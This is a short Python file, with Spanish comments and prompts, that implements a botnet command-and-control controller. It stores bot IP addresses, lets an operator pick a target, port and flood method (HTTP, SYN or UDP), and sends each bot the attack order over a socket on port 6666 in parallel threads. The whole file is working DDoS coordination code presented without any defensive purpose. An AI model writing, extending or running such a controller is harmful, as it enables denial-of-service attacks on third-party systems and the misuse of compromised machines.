import socket
import threading

class Botnet:
    def __init__(self):
        self.bots = []
        self.is_active = False

    def add_bot(self, ip):
        self.bots.append(ip)
        print(f"[+] Bot añadido: {ip}")

    def command_bots(self, target, port, method):
        if not self.bots:
            print("[!] No hay bots conectados.")
            return

        print(f"[+] Ordenando ataque {method} a {target}:{port}...")
        for bot in self.bots:
            threading.Thread(target=self._send_command, args=(bot, target, port, method)).start()

    def _send_command(self, bot_ip, target, port, method):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((bot_ip, 6666))  # Puerto C2 ficticio
            s.send(f"{method}|{target}|{port}".encode())
            s.close()
        except:
            print(f"[!] Bot {bot_ip} no responde.")

    def manage_bots(self):
        print("\n=== GESTIÓN DE BOTS ===")
        print(f"Bots activos: {len(self.bots)}")
        for bot in self.bots:
            print(f"- {bot}")
        print("\n1. Añadir bot manual")
        print("2. Ordenar ataque")
        choice = input("> Selecciona: ")
        if choice == "1":
            ip = input("IP del bot: ")
            self.add_bot(ip)
        elif choice == "2":
            target = input("Objetivo: ")
            port = int(input("Puerto: "))
            method = input("Método (HTTP/SYN/UDP): ")
            self.command_bots(target, port, method)